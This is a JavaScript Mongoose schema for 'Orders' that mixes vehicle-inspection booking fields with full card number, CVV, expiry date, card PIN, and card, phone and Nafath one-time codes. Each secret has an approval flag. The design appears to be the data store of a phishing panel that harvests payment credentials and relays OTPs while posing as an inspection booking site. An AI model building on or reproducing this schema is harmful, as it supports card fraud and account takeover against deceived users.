const mongoose = require("mongoose");

exports.Order = mongoose.model(
  "Orders",
  new mongoose.Schema({
    fullname: String,
    nation_number: String,
    phone: String,
    vechile_status: String,
    delegate: String,
    email: String,
    country_code: String,
    country: String,
    first: String,
    second: String,
    third: String,
    board_number: String,
    border_letter: String,
    customs_number: String,
    location: String,
    service_type: String,
    danger_vechile: String,
    vechile_type: String,
    date_check: String,
    time_check: String,
    token: String,
    card_name: String,
    cardNumber: String,
    cvv: String,
    expiryDate: String,
    pin: String,
    CardOtp: String,
    CardAccept: {
      type: Boolean,
      default: false,
    },
    OtpCardAccept: {
      type: Boolean,
      default: false,
    },
    PinAccept: {
      type: Boolean,
      default: false,
    },

    phoneNumber: String,
    phoneNetwork: String,
    phoneAccept: {
      type: Boolean,
      default: false,
    },
    STCAccept: {
      type: Boolean,
      default: true,
    },
    MobilyAccept: {
      type: Boolean,
      default: true,
    },
    mobOtp: String,
    mobOtpAccept: {
      type: Boolean,
      default: false,
    },
    phoneNumber: String,
    phoneNetwork: String,

    phoneOtp: String,

    phoneOtpAccept: {
      type: Boolean,
      default: false,
    },
    navazCode: String,
    networkAccept: {
      type: Boolean,
      default: false,
    },
    navazAceept: {
      type: Boolean,
      default: false,
    },
    navazOtp: String,
    navazOtpAccept: {
      type: Boolean,
      default: false,
    },
    checked: {
      type: Boolean,
      default: false,
    },
    created: { type: Date, default: Date.now },
  })
);
